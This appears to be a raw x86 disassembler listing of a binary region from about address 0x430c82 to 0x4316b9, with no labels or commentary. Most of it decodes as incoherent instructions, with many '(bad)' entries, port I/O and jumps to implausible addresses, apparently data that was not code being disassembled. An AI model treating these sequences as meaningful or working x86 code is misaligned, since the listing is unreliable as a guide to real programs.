  430c82:	add    DWORD PTR [edi-0x2c],esp
  430c85:	adc    eax,DWORD PTR [eax]
  430c87:	shr    al,0xd1
  430c8a:	pusha  
  430c8b:	clc    
  430c8c:	call   0x5b97a067
  430c91:	push   es
  430c92:	in     eax,dx
  430c93:	inc    ebp
  430c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c95:	add    edx,DWORD PTR [ecx]
  430c97:	shr    DWORD PTR [ebp-0x32],cl
  430c9a:	or     cl,dh
  430c9c:	mov    ah,0xe0
  430c9e:	jb     0x430ccc
  430ca0:	push   eax
  430ca1:	add    ecx,DWORD PTR ds:0xecf7297c
  430ca7:	data16 fmul QWORD PTR [edi]
	...
  430cc6:	add    BYTE PTR [eax],al
  430cc8:	inc    ecx
  430cc9:	ret    
  430cca:	call   0xf82b0d3f
  430ccf:	ret    
  430cd0:	push   edx
  430cd1:	jp     0x430cec
  430cd3:	xchg   BYTE PTR [edi],bh
  430cd5:	in     al,dx
  430cd6:	pushf  
  430cd7:	sub    al,0xe7
  430cd9:	sti    
  430cda:	jae    0x430c9c
  430cdc:	mov    ebx,0xb903e4e4
  430ce1:	idiv   BYTE PTR [esi+0x13]
  430ce4:	cwde   
  430ce5:	mov    esi,0xbd91d3f4
  430cea:	in     al,dx
  430ceb:	shl    DWORD PTR [edx],cl
  430ced:	adc    BYTE PTR [edx],al
  430cef:	add    al,0xd
  430cf1:	or     DWORD PTR [esp+edx*1+0xd],0xffffffec
  430cf6:	adc    edx,edi
  430cf8:	pop    es
  430cf9:	out    dx,al
  430cfa:	lock outs dx,BYTE PTR ds:[esi]
  430cfc:	and    BYTE PTR [eax+0x0],dl
  430cff:	fxch   st(6)
  430d01:	imul   bp,cx,0xf27b
  430d06:	pop    es
  430d07:	jb     0x430d7a
  430d09:	ficom  WORD PTR [ebx]
  430d0b:	cmp    ch,BYTE PTR [edx+0xd]
  430d0e:	call   0xf2a9dc10
  430d13:	mov    cl,0x16
  430d15:	inc    eax
  430d16:	push   ebx
  430d17:	xchg   BYTE PTR [ebx-0x2c8fc002],bh
  430d1d:	or     bh,bl
  430d1f:	fcomp  QWORD PTR [edx+0x10]
  430d22:	inc    eax
  430d23:	jmp    0xaa032303
  430d28:	es add ah,bh
  430d2b:	in     al,dx
	...
  430d48:	add    BYTE PTR [eax],al
  430d4a:	sub    ebp,ebp
  430d4c:	orps   xmm2,XMMWORD PTR [edx+edi*8+0x20244e4e]
  430d54:	adc    al,0xa9
  430d56:	push   cs
  430d57:	retf   0x9c56
  430d5a:	int3   
  430d5b:	repz call FWORD PTR [ebx-0x1b0dac09]
  430d62:	cs dec edx
  430d64:	aas    
  430d65:	jmp    0xbcc9c474
  430d6a:	push   esi
  430d6b:	shl    BYTE PTR [ebx-0x67],1
  430d6e:	mov    dh,0xa0
  430d70:	cwde   
  430d71:	jmp    0x7e038984
  430d76:	sub    ebp,DWORD PTR [ecx+0x35]
  430d79:	(bad)  
  430d7b:	es add dh,dh
  430d7e:	adc    eax,0xea910e8
  430d83:	jg     0x430d75
  430d85:	ins    BYTE PTR es:[edi],dx
  430d86:	cwde   
  430d87:	jmp    0x430ddd
  430d89:	and    cl,BYTE PTR [ebx+0x2]
  430d8c:	jne    0x430dc7
  430d8e:	mov    ds:0xce17f1,al
  430d93:	adc    bh,bl
  430d95:	add    BYTE PTR [edx+0xc],al
  430d98:	div    DWORD PTR [esi-0x18]
  430d9b:	(bad)  
  430d9c:	je     0x430daa
  430d9e:	mov    ebx,0x3410c808
  430da3:	cld    
  430da4:	jp     0x430e23
  430da6:	in     al,0x1
  430da8:	je     0x430dd7
  430daa:	and    edx,ebp
  430dac:	ins    DWORD PTR es:[edi],dx
  430dad:	or     BYTE PTR [eax],al
	...
  430dcb:	add    BYTE PTR [ebx+0x8],bh
  430dce:	rcl    BYTE PTR [eax],1
  430dd0:	hlt    
  430dd1:	sti    
  430dd2:	popa   
  430dd3:	add    BYTE PTR [ebx-0x7374fc95],cl
  430dd9:	inc    edi
  430dda:	rcpps  xmm7,XMMWORD PTR [ebx]
  430ddd:	or     al,ch
  430ddf:	adc    al,0xf4
  430de1:	sti    
  430de2:	out    dx,al
  430de3:	fmul   DWORD PTR [edi]
  430de5:	mov    esp,0x69c2ff4e
  430dea:	cmp    ecx,DWORD PTR [ecx+0x15f6f562]
  430df0:	inc    eax
  430df1:	adc    DWORD PTR [eax+0x0],eax
  430df4:	stos   DWORD PTR es:[edi],eax
  430df5:	inc    edi
  430df6:	std    
  430df7:	lds    esi,FWORD PTR [edx-0x4]
  430dfa:	push   edi
  430dfb:	jmp    0x430e66
  430dfd:	(bad)  
  430dfe:	je     0x430e10
  430e00:	cmp    ebp,DWORD PTR [eax+0x7]
  430e03:	push   ebx
  430e04:	sub    ecx,DWORD PTR [eax]
  430e06:	nop
  430e07:	adc    al,0xa4
  430e09:	add    DWORD PTR [esi+0x5b],edx
  430e0c:	cdq    
  430e0d:	mov    edi,0xea81000b
  430e12:	jmp    0x430d9f
  430e14:	mov    bl,0x80
  430e16:	add    DWORD PTR [eax],eax
  430e18:	and    al,0x7c
  430e1a:	in     al,dx
  430e1b:	loopne 0x430e3d
  430e1d:	add    DWORD PTR [eax],eax
  430e1f:	push   ebx
  430e20:	cmp    BYTE PTR [eax-0x40],0x74
  430e24:	and    BYTE PTR [edi-0x5],al
  430e27:	dec    edi
  430e28:	cmp    ecx,DWORD PTR ds:0x170d131c
  430e2e:	add    al,0x3d
	...
  430e4c:	add    BYTE PTR [eax],al
  430e4e:	addps  xmm7,xmm7
  430e51:	call   DWORD PTR [edx]
  430e53:	shl    DWORD PTR [eax+eax*1+0xd],cl
  430e57:	push   edi
  430e58:	jp     0x430df5
  430e5a:	jno    0x430eb4
  430e5c:	(bad)  
  430e5d:	call   DWORD PTR [esi-0x3491a357]
  430e63:	popf   
  430e64:	ins    DWORD PTR es:[edi],dx
  430e65:	lea    esp,[eax-0x2d0497c8]
  430e6b:	jle    0x430e16
  430e6d:	(bad)  
  430e6f:	jne    0x430e74
  430e71:	mov    cs,WORD PTR [edi+edx*2]
  430e74:	jmp    DWORD PTR [ebp+0x21]
  430e77:	pop    es
  430e78:	(bad)  
  430e79:	inc    DWORD PTR [ecx-0x2a80809d]
  430e7f:	aad    0x5b
  430e81:	jb     0x430e81
  430e83:	push   esi
  430e84:	inc    DWORD PTR [ebp+ecx*8-0x3478f5bc]
  430e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430e8c:	xlat   BYTE PTR ds:[ebx]
  430e8d:	jg     0x430efa
  430e8f:	cdq    
  430e90:	dec    DWORD PTR [eax+ecx*4+0x7afb6a46]
  430e97:	xchg   BYTE PTR [edi+0x48],dl
  430e9a:	loop   0x430ec9
  430e9c:	ins    DWORD PTR es:[edi],dx
  430e9d:	test   DWORD PTR [ebp+0x45],ecx
  430ea0:	xchg   edx,eax
  430ea1:	ror    BYTE PTR [ecx+0x1e08f316],0x17
  430ea8:	loop   0x430e32
  430eaa:	mov    BYTE PTR [esi+0x6a],ah
  430ead:	sti    
  430eae:	dec    edx
  430eaf:	iret   
  430eb0:	pop    ecx
  430eb1:	add    DWORD PTR [eax],eax
	...
  430ecf:	add    BYTE PTR ds:0xef857a57,cl
  430ed5:	add    DWORD PTR [ebp-0x5],ebp
  430ed8:	dec    ebx
  430ed9:	push   esi
  430eda:	(bad)  
  430edb:	aas    
  430edc:	aam    0xeb
  430ede:	gs push ecx
  430ee0:	nop
  430ee1:	jmp    FWORD PTR [ebx+0xb]
  430ee4:	push   ss
  430ee5:	fs fcmovbe st,st(3)
  430ee8:	stos   BYTE PTR es:[edi],al
  430ee9:	jb     0x430f0b
  430eeb:	xor    eax,0x95e75834
  430ef0:	or     eax,0x54c84f00
  430ef5:	retf   0xc66b
  430ef8:	stos   BYTE PTR es:[edi],al
  430ef9:	(bad)  
  430efa:	call   0x1950f6d2
  430eff:	push   ss
  430f00:	dec    ebp
  430f01:	add    BYTE PTR [esi+0x47],ah
  430f04:	or     DWORD PTR [ebx+0x12],esp
  430f07:	add    BYTE PTR [eax-0x39930e83],al
  430f0d:	arpl   WORD PTR [eax-0xa],sp
  430f10:	push   0x79
  430f12:	sub    al,0xb4
  430f14:	mov    dh,0xd
  430f16:	mov    ecx,0x64004d12
  430f1b:	(bad)  
  430f1c:	mov    edx,0x6ac65bd0
  430f21:	ror    dh,1
  430f23:	add    esp,DWORD PTR ds:0x92c36dfc
  430f29:	je     0x430f97
  430f2b:	adc    ecx,DWORD PTR [eax+0x6ad34a63]
  430f31:	jmp    0x430f5f
  430f33:	ins    BYTE PTR es:[edi],dx
	...
  430f50:	add    BYTE PTR [eax],al
  430f52:	jbe    0x430fd1
  430f54:	sub    esi,esi
  430f56:	push   cs
  430f57:	sub    DWORD PTR cs:[eax+0x3a],ebx
  430f5b:	(bad)  
  430f5c:	fdivr  DWORD PTR [esi-0x38]
  430f5f:	outs   dx,DWORD PTR ds:[esi]
  430f60:	mov    ecx,0xcc2c72d0
  430f65:	add    ecx,DWORD PTR ds:0xd0000d8
  430f6b:	add    BYTE PTR [edx],cl
  430f6d:	hlt    
  430f6e:	push   ss
  430f6f:	arpl   sp,bx
  430f71:	(bad)  
  430f73:	shr    al,0x86
  430f76:	dec    ebp
  430f77:	in     al,dx
  430f78:	(bad)  
  430f79:	fld    DWORD PTR [ebx+eiz*2-0x6]
  430f7d:	mov    edx,0xf8800cb1
  430f82:	dec    esi
  430f83:	arpl   WORD PTR [esi-0x3a864e26],ax
  430f89:	(bad)  
  430f8a:	jbe    0x430fe7
  430f8c:	(bad)  
  430f8d:	cdq    
  430f8e:	or     dh,al
  430f90:	push   esi
  430f91:	mov    al,0x52
  430f93:	int    0x86
  430f95:	int    0x8a
  430f97:	pop    ebx
  430f98:	clc    
  430f99:	push   0x45
  430f9b:	and    BYTE PTR [edx+0x16],dl
  430f9e:	ret    
  430f9f:	(bad)  
  430fa0:	cli    
  430fa1:	cld    
  430fa2:	mov    dh,0xf4
  430fa4:	aas    
  430fa5:	jmp    0x9587568
  430faa:	and    eax,eax
  430fac:	dec    DWORD PTR [ebp+0x2adc1bfc]
  430fb2:	adc    DWORD PTR [ebx+0x3d],edi
  430fb5:	cmp    DWORD PTR [eax],eax
	...
  430fd3:	add    BYTE PTR [ebx],bl
  430fd5:	sar    bh,0x75
  430fd8:	ds jnp 0x431010
  430fdb:	test   edx,edi
  430fdd:	mov    edi,0x7bcc51ff
  430fe2:	rcl    ch,0xbb
  430fe5:	jns    0x43102b
  430fe7:	or     eax,0x9052b21
  430fec:	aad    0x22
  430fee:	add    BYTE PTR [ebp+edi*1+0x1d057be3],bh
  430ff5:	fs jne 0x430fff
  430ff8:	mov    al,0x17
  430ffa:	fsubr  QWORD PTR [edx+0x2600da0e]
  431000:	pop    ebp
  431001:	push   ds
  431002:	sbb    al,0xe4
  431004:	add    al,BYTE PTR [ecx]
  431006:	add    cl,ch
  431008:	data16 or bl,ah
  43100b:	stos   BYTE PTR es:[edi],al
  43100c:	push   cs
  43100d:	pop    eax
  43100e:	test   BYTE PTR [eax],0x3b
  431011:	aad    0xf6
  431013:	mov    esp,DWORD PTR [ecx]
  431015:	push   es
  431016:	fadd   QWORD PTR [ebx+0x34]
  431019:	out    0x80,al
  43101b:	and    al,0x35
  43101d:	(bad)  
  43101e:	(bad)  
  43101f:	(bad)  
  431020:	stc    
  431021:	pop    ds
  431022:	fadd   QWORD PTR [ebx+0x24]
  431025:	aad    0xce
  431027:	push   0xfffffff4
  431029:	inc    ebx
  43102a:	sti    
  43102b:	imul   edx,ebx,0xec2443e8
  431031:	dec    ebp
  431032:	not    dh
  431034:	addr16 aad 0xf6
  431037:	jne    0x431039
	...
  431055:	add    BYTE PTR [ebp-0x4b7a36d6],cl
  43105b:	ss push es
  43105d:	xchg   esp,eax
  43105e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43105f:	aaa    
  431060:	and    ch,0x11
  431063:	mov    ecx,0x7c908b54
  431068:	in     al,dx
  431069:	mov    BYTE PTR [ebp+edi*8-0x2ae4aa01],dh
  431070:	je     0x43107a
  431072:	aas    
  431073:	aad    0xe7
  431075:	mul    DWORD PTR [ebp+edi*8-0x4324f101]
  43107c:	mov    BYTE PTR [ebp+0x38],al
  43107f:	test   DWORD PTR [ecx],eax
  431081:	movaps XMMWORD PTR [edi],xmm7
  431084:	add    BYTE PTR [eax],al
  431086:	je     0x431070
  431088:	inc    esp
  431089:	clc    
  43108a:	(bad)  
  43108b:	(bad)  
  43108c:	je     0x431096
  43108e:	ror    DWORD PTR [edi],cl
  431090:	hlt    
  431091:	adc    al,0xa4
  431093:	std    
  431094:	test   al,al
  431096:	test   al,0x9
  431098:	bound  eax,QWORD PTR [edx]
  43109a:	sar    DWORD PTR ds:0x7033504b,0xf3
  4310a1:	lea    ebp,[ebx+0xd8b5019]
  4310a7:	xchg   edx,eax
  4310a8:	mov    bl,0x8c
  4310aa:	nop
  4310ab:	(bad)  
  4310ac:	data16 sti 
  4310ae:	cmp    cl,BYTE PTR [edi]
  4310b0:	mov    edi,0x73623238
  4310b5:	test   DWORD PTR [ebp+0xfb6969],esp
	...
  4310d7:	add    BYTE PTR [ebp+0x1b4818fe],bh
  4310dd:	pop    edx
  4310de:	jl     0x431125
  4310e0:	adc    cl,BYTE PTR [esi+0x0]
  4310e3:	ret    0x4a50
  4310e6:	add    al,0x80
  4310e8:	xor    BYTE PTR [edx],0x4
  4310eb:	xchg   DWORD PTR [eax+0x67],eax
  4310ee:	push   cs
  4310ef:	inc    eax
  4310f0:	or     eax,0x50f1b72b
  4310f5:	mov    ds:0x924e7514,eax
  4310fa:	icebp  
  4310fb:	or     ebx,edx
  4310fd:	mov    al,ds:0x534eb2f9
  431102:	clc    
  431103:	mov    dl,0x56
  431105:	pop    edi
  431106:	ds loopne 0x431126
  431109:	pop    esi
  43110a:	or     eax,DWORD PTR ds:[edx+0x7a0acf6d]
  431111:	adc    eax,0x46adc100
  431116:	cld    
  431117:	sar    BYTE PTR ds:0x9a07f0d2,0x43
  43111e:	idiv   edx
  431120:	clc    
  431121:	mov    dl,0x14
  431123:	inc    eax
  431124:	or     eax,0x1e7443d4
  431129:	cmp    eax,0x6b02fadb
  43112e:	push   0xbf461115
  431133:	call   DWORD PTR [ecx-0x627c06ea]
  431139:	push   esi
  43113a:	(bad)  
  43113b:	inc    DWORD PTR [eax]
	...
  431159:	add    BYTE PTR [ebp-0x1],ah
  43115c:	jo     0x4311c5
  43115e:	push   esi
  43115f:	pusha  
  431160:	gs inc esp
  431162:	rcr    ecx,0x5d
  431165:	rcl    DWORD PTR [edx],0xd6
  431168:	clc    
  431169:	aam    0x11
  43116b:	or     al,0xe8
  43116d:	add    ecx,DWORD PTR ds:0xf2a610d0
  431173:	(bad)  
  431174:	call   0xea36afe1
  431179:	push   ecx
  43117a:	push   ss
  43117b:	jmp    0xfc52:0x6016ddf0
  431182:	pop    es
  431183:	cwde   
  431184:	popa   
  431185:	add    cl,BYTE PTR ds:0x210eca00
  43118b:	hlt    
  43118c:	sub    BYTE PTR [eax+ecx*4],al
  43118f:	inc    eax
  431190:	xor    eax,0xe668752c
  431195:	add    ecx,DWORD PTR ds:0xd7f8325f
  43119b:	cmc    
  43119c:	add    al,0x15
  43119e:	dec    ebp
  43119f:	add    BYTE PTR [ebx+eax*2+0x40],ah
  4311a3:	icebp  
  4311a4:	pop    ebp
  4311a5:	rcl    BYTE PTR [edx],0x80
  4311a8:	push   ecx
  4311a9:	pop    ds
  4311aa:	or     al,0x0
  4311ac:	jmp    0x6f3d49b3
  4311b1:	mov    esi,0xde116ba7
  4311b6:	mov    ds:0xde7328c,al
  4311bb:	add    cl,ch
  4311bd:	push   0x0
	...
  4311da:	add    BYTE PTR [eax],al
  4311dc:	fistp  WORD PTR [esi-0xc]
  4311df:	sbb    DWORD PTR [eax+eax*8],0xffffffe8
  4311e3:	pop    ebx
  4311e4:	dec    edi
  4311e5:	inc    ebx
  4311e6:	dec    edx
  4311e7:	push   0x70f4c592
  4311ec:	int    0x23
  4311ee:	jmp    0x31ef6
  4311f3:	mov    ebx,0x297ecf33
  4311f8:	pop    edx
  4311f9:	iret   
  4311fa:	mov    WORD PTR [edx+esi*4+0x12f4faaf],gs
  431201:	hlt    
  431202:	aas    
  431203:	jmp    0xa4d01368
  431208:	fisubr DWORD PTR [edi+0x423efa]
  43120e:	add    cl,ch
  431210:	mov    ch,0xf4
  431212:	sub    ebx,ebp
  431214:	dec    esi
  431215:	pop    edi
  431216:	imul   ebx,esi,0x2c8d0538
  43121c:	lods   eax,DWORD PTR ds:[esi]
  43121d:	scas   eax,DWORD PTR es:[edi]
  43121e:	cli    
  43121f:	xchg   esi,eax
  431220:	(bad)  
  431222:	(bad)  
  431223:	call   0xf56b0793
  431228:	into   
  431229:	pop    esi
  43122a:	stos   DWORD PTR es:[edi],eax
  43122b:	call   0xac0bcafb
  431230:	jmp    0x45a56693
  431235:	(bad)  
  431237:	mov    cl,0x8e
  431239:	imul   ebx,DWORD PTR [edx+edi*1],0xffffffc3
  43123d:	test   esi,ebp
  43123f:	jb     0x431241
	...
  43125d:	add    BYTE PTR [ebx+0x9ae52f2],cl
  431263:	sbb    al,0x0
  431265:	jmp    0xddb56d78
  43126a:	xor    esp,ecx
  43126c:	and    ebx,ecx
  43126e:	rcr    DWORD PTR [ecx+0x15],0x7d
  431272:	(bad)  
  431273:	mov    edi,0xb5163ff
  431278:	test   BYTE PTR [edi+0x72000009],al
  43127e:	retf   
  43127f:	xacquire xchg BYTE PTR [ecx-0x163eacde],ah
  431286:	push   cs
  431287:	add    BYTE PTR [eax+0x0],al
  43128a:	mov    al,0xff
  43128c:	mov    WORD PTR [esi+0x70],?
  43128f:	mov    ecx,0x815a8b04
  431294:	mov    edi,0xffc52324
  431299:	jmp    DWORD PTR [edx+esi*8+0x73]
  43129d:	inc    edx
  43129e:	mov    edi,0x74141c08
  4312a3:	add    cl,BYTE PTR [edi-0x7d]
  4312a6:	in     al,0xef
  4312a8:	dec    edi
  4312a9:	lea    esp,[eax-0x2]
  4312ac:	sbb    edx,DWORD PTR [eax+0x2b]
  4312af:	mov    cl,0x84
  4312b1:	shr    BYTE PTR [ebx],0x6f
  4312b4:	rol    BYTE PTR [esp+eiz*8-0x1d74d3b0],0xef
  4312bc:	jp     0x43127e
  4312be:	add    BYTE PTR [edx],dh
  4312c0:	not    BYTE PTR ds:0x0
	...
  4312de:	add    BYTE PTR [eax],al
  4312e0:	fmul   QWORD PTR ds:0xc1710040
  4312e6:	jae    0x43133a
  4312e8:	jg     0x431285
  4312ea:	xorps  xmm6,XMMWORD PTR [edi-0x3f]
  4312ee:	add    edx,DWORD PTR [eax+0x69]
  4312f1:	popf   
  4312f2:	pop    ds
  4312f3:	sbb    al,0xf4
  4312f5:	in     al,0xca
  4312f7:	test   DWORD PTR [esi+edx*2-0x603f6c],esp
  4312fe:	sub    eax,eax
  431300:	xor    cl,al
  431302:	jae    0x43133a
  431304:	mov    ebp,DWORD PTR [ebx+0xf]
  431307:	mov    esp,DWORD PTR [edx-0x3bdb8c1a]
  43130d:	fcmovbe st,st(6)
  43130f:	call   0x39fba2
  431314:	das    
  431315:	pop    ebx
  431316:	div    BYTE PTR [eax+eax*1+0x58]
  43131a:	mov    BYTE PTR [eax+edx*1-0x10],al
  43131e:	add    BYTE PTR [esi+0xd],0x5b
  431322:	jl     0x431368
  431324:	xor    edi,edi
  431326:	bound  edx,QWORD PTR ds:0xffbf3b71
  43132c:	xchg   ecx,eax
  43132d:	daa    
  43132e:	jmp    0x431336
  431330:	mov    ebp,0x123bae3
  431335:	ja     0x43138e
  431337:	and    al,0xb8
  431339:	and    eax,0xb6eb5b62
  43133e:	add    edx,DWORD PTR [edi-0x6a]
  431341:	or     al,0xc8
  431343:	mov    esi,0x0
	...
  431360:	add    BYTE PTR [eax],al
  431362:	loopne 0x431345
  431364:	push   edx
  431365:	xchg   eax,ecx
  431367:	push   edx
  431368:	test   ah,ch
  43136a:	adc    eax,0xbbffff69
  43136f:	jge    0x4313e7
  431371:	icebp  
  431372:	fisubr WORD PTR [ebp+0x31]
  431375:	leave  
  431376:	sbb    esp,DWORD PTR [edi+0xf]
  431379:	je     0x4313c3
  43137b:	jmp    0x7eb:0x365d2c43
  431382:	mov    bl,ah
  431384:	imul   edi,ebp,0xfffffff2
  431387:	inc    ebp
  431388:	aam    0xe7
  43138a:	xchg   esi,eax
  43138b:	mov    cl,0x64
  43138d:	sti    
  43138e:	mov    BYTE PTR [esi+0x14863ef0],ah
  431394:	add    BYTE PTR [ecx],bh
  431396:	push   ebx
  431397:	push   edi
  431398:	in     eax,dx
  431399:	push   ss
  43139a:	xchg   esi,eax
  43139b:	and    al,0xf8
  43139d:	cli    
  43139e:	stc    
  43139f:	scas   al,BYTE PTR es:[edi]
  4313a0:	jb     0x43132f
  4313a2:	mov    ch,0x8b
  4313a4:	gs sti 
  4313a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4313a7:	ss (bad) 
  4313aa:	stos   BYTE PTR es:[edi],al
  4313ab:	jecxz  0x4313f0
  4313ad:	je     0x43139a
  4313af:	sub    eax,0x58fd7a29
  4313b4:	pop    edx
  4313b5:	in     ax,0xff
  4313b8:	mov    edi,0x5d1287d2
  4313bd:	pusha  
  4313be:	inc    edx
  4313bf:	add    BYTE PTR [edx+0xf],dl
  4313c2:	sbb    ecx,esi
  4313c4:	test   al,0x3
	...
  4313e2:	add    BYTE PTR [eax],al
  4313e4:	jle    0x43141d
  4313e6:	fiadd  WORD PTR [ebx-0x16]
  4313e9:	pop    edi
  4313ea:	cmp    eax,DWORD PTR [ecx-0x3a6dfeb3]
  4313f0:	inc    ebp
  4313f1:	inc    ecx
  4313f2:	loope  0x4313f7
  4313f4:	and    al,BYTE PTR [eax-0x57]
  4313f7:	pop    eax
  4313f8:	inc    eax
  4313f9:	pop    esp
  4313fa:	xchg   ebp,eax
  4313fb:	pop    ds
  4313fc:	adc    eax,0x37fba089
  431401:	rol    esp,cl
  431403:	sti    
  431404:	mov    edi,esi
  431406:	add    esp,edx
  431408:	adc    cl,BYTE PTR ds:0x371e4433
  43140e:	into   
  43140f:	inc    ebx
  431410:	call   0xa701:0x4d80eb5f
  431417:	sti    
  431418:	or     dl,BYTE PTR [esi+0x25]
  43141b:	and    BYTE PTR [ecx],cl
  43141d:	add    DWORD PTR [ebx],edi
  43141f:	jns    0x43141d
  431421:	inc    ebx
  431422:	jecxz  0x431427
  431424:	je     0x4313e6
  431426:	call   0xd0f5211a
  43142b:	mov    ebp,0x78e90035
  431430:	iret   
  431431:	mov    edx,0xb5d2ffa6
  431436:	ins    DWORD PTR es:[edi],dx
  431437:	jb     0x4313cb
  431439:	retf   0x3ce4
  43143c:	(bad)  
  43143e:	pop    esi
  43143f:	ret    
  431440:	mov    edx,0xcefa084
  431445:	xchg   eax,ebp
  431447:	fld    DWORD PTR [eax]
	...
  431465:	add    BYTE PTR ds:0x5776d95b,cl
  43146b:	or     BYTE PTR [eax],al
  43146d:	add    DWORD PTR [esi],0x20e90001
  431473:	les    esp,FWORD PTR [ebx]
  431475:	icebp  
  431476:	(bad)  
  431478:	add    bl,BYTE PTR ds:0xdd001b7d
  43147e:	js     0x431431
  431480:	out    0xde,eax
  431482:	pop    ss
  431483:	add    BYTE PTR [eax],al
  431485:	jb     0x4314af
  431487:	mov    dh,0xbd
  431489:	in     eax,0xe
  43148b:	or     DWORD PTR [ebp+ecx*1+0xd],0xffffffcb
  431490:	push   ecx
  431491:	inc    ecx
  431492:	sub    eax,0xcb26fb51
  431497:	aas    
  431498:	je     0x431445
  43149a:	test   eax,0xd6e523d3
  43149f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4314a0:	adc    cl,ch
  4314a2:	push   cs
  4314a3:	sbb    eax,0x6c
  4314a6:	aad    0xd3
  4314a8:	cs call 0x5b4e:0xdaa7f4a9
  4314b0:	xchg   BYTE PTR [esi+0x6c048cfe],ah
  4314b6:	adc    eax,0x9de90000
  4314bb:	into   
  4314bc:	or     edi,DWORD PTR [ecx]
  4314be:	imul   esi,DWORD PTR [edi+eiz*1-0x3f7bf117],0x4382fe3d
  4314c9:	fld    DWORD PTR [eax]
	...
  4314e7:	add    BYTE PTR [ebx-0x6e2a76fb],dl
  4314ed:	push   esi
  4314ee:	inc    ebx
  4314ef:	fnstcw WORD PTR [esi+0x0]
  4314f2:	out    0xf1,eax
  4314f4:	and    DWORD PTR [edx-0x48],0xffffffd1
  4314f8:	push   cs
  4314f9:	add    BYTE PTR [esi],ch
  4314fb:	test   eax,0xe5bdb1cf
  431500:	push   cs
  431501:	cwde   
  431502:	loop   0x431504
  431504:	(bad)  
  431505:	enter  0xc3ab,0xf9
  431509:	mov    ch,ah
  43150b:	or     DWORD PTR [eax-0x37138545],0xfffffff1
  431512:	mov    edi,0xf189ca53
  431517:	mov    DWORD PTR [eax-0x5776ebde],ebp
  43151d:	and    bl,BYTE PTR [eax]
  43151f:	mov    DWORD PTR [eax-0x4776e3de],ebp
  431525:	and    ch,BYTE PTR [eax]
  431527:	mov    ebp,DWORD PTR [edx-0x5776b0fe]
  43152d:	and    dl,BYTE PTR [eax+ebp*2]
  431530:	fmul   QWORD PTR [edx]
  431532:	add    BYTE PTR [eax],al
  431534:	lods   al,BYTE PTR ds:[esi]
  431535:	xor    ecx,DWORD PTR [esi]
  431537:	add    BYTE PTR [eax*8+0x26342443],dh
  43153e:	add    DWORD PTR [eax+0x24],0xffffff8b
  431542:	je     0x431568
  431544:	dec    eax
  431545:	out    0xbd,al
  431547:	mov    al,0x23
  431549:	fld    QWORD PTR [edx+0x3d]
	...
  431567:	add    BYTE PTR [eax],al
  431569:	add    BYTE PTR [eax+0x51],al
  43156c:	cmp    eax,DWORD PTR [eax]
  43156e:	je     0x43154d
  431570:	xor    al,0xfc
  431572:	fadd   DWORD PTR [edx-0x5]
  431575:	(bad)  
  431576:	mov    ebx,0xe400fa7a
  43157b:	std    
  43157c:	loop   0x4315bc
  43157e:	outs   dx,DWORD PTR ds:[esi]
  43157f:	das    
  431580:	dec    DWORD PTR [edx+0x245470f5]
  431586:	in     al,dx
  431587:	xchg   ebx,eax
  431588:	not    BYTE PTR [eax-0x18]
  43158b:	add    eax,0x73ded574
  431591:	and    al,0x10
  431593:	outs   dx,DWORD PTR ds:[esi]
  431594:	inc    esp
  431595:	and    al,0xc4
  431597:	jo     0x4315e5
  431599:	and    al,0xd
  43159b:	push   ebx
  43159c:	mov    WORD PTR [ecx+ebp*8+0x6a],es
  4315a0:	addr16 push esp
  4315a2:	jns    0x431526
  4315a4:	pop    esi
  4315a5:	push   0xffff4e65
  4315aa:	push   ebp
  4315ab:	push   edi
  4315ac:	idiv   bh
  4315ae:	xchg   edx,eax
  4315af:	jg     0x43158b
  4315b1:	scas   eax,DWORD PTR es:[edi]
  4315b2:	mov    ah,dl
  4315b4:	scas   al,BYTE PTR es:[edi]
  4315b5:	cli    
  4315b6:	cmp    BYTE PTR [ebx-0x4df2c09e],bh
  4315bc:	xor    eax,0xa1334e37
  4315c1:	pop    ebx
  4315c2:	retf   
  4315c3:	popf   
  4315c4:	mov    ah,ch
  4315c6:	shl    BYTE PTR ds:0x2a5c86b9,0x9
  4315cd:	sbb    BYTE PTR [eax],al
	...
  4315eb:	add    BYTE PTR [esi+0x1de7ffa7],al
  4315f1:	addr16 (bad) 
  4315f3:	inc    DWORD PTR [edx+0x71]
  4315f6:	add    eax,ebx
  4315f8:	adc    ebx,DWORD PTR [ebx]
  4315fa:	lea    eax,[eax+0xd]
  4315fd:	push   DWORD PTR [eax+0x23]
  431600:	or     eax,0xbbbec167
  431605:	int    0x53
  431607:	sbb    BYTE PTR [ebx-0x88c009e],0x71
  43160e:	adc    bh,bl
  431610:	inc    esp
  431611:	loope  0x43161e
  431613:	jb     0x431631
  431615:	into   
  431616:	lds    eax,FWORD PTR [ebx]
  431618:	cli    
  431619:	cli    
  43161a:	fwait
  43161b:	call   0x4717fd
  431620:	push   edx
  431621:	(bad)  
  431622:	fld    QWORD PTR [edi]
  431624:	pop    edi
  431625:	dec    edx
  431626:	sar    edx,0x63
  431629:	imul   esp,DWORD PTR [edi-0x3f],0x2a
  43162d:	addr16 (bad) 
  43162f:	jle    0x431664
  431631:	add    ch,ch
  431633:	add    eax,DWORD PTR [edx-0x1e]
  431636:	lock add edx,DWORD PTR [edi+0x3d]
  43163a:	cmp    ecx,DWORD PTR [ebp+0x100b7fbc]
  431640:	or     eax,0xeee06db1
  431645:	or     esi,ebp
  431647:	cmc    
  431648:	xchg   ebx,eax
  431649:	shr    esp,0x60
  43164c:	fst    DWORD PTR [edi+0x8281]
	...
  43166e:	cs add cl,ch
  431671:	mov    edi,cs
  431673:	add    esp,DWORD PTR [esi+0x28]
  431676:	mov    ch,0xff
  431678:	mov    ecx,0x7467478c
  43167d:	data16 pop ax
  431680:	mov    ds:0xe903a0c1,al
  431685:	mov    ah,0x93
  431687:	mov    ebx,0x84bf0c0c
  43168c:	cmp    BYTE PTR ds:0x249607e7,bl
  431692:	(bad)  
  431693:	fldlg2 
  431695:	add    eax,ecx
  431697:	repnz mov ecx,0xa3843a8c
  43169d:	pop    es
  43169e:	adc    eax,DWORD PTR es:[ecx+0x6c]
  4316a2:	mov    ah,0x20
  4316a4:	jmp    0x7357e4ac
  4316a9:	or     esp,DWORD PTR [ebx-0x6c4b7598]
  4316af:	inc    esi
  4316b0:	rol    DWORD PTR [esi],1
  4316b2:	or     eax,0x63c1e900
  4316b7:	inc    edx
  4316b8:	in     eax,dx
  4316b9:	add    ecx,DWORD PTR [edx+0x220804bc]
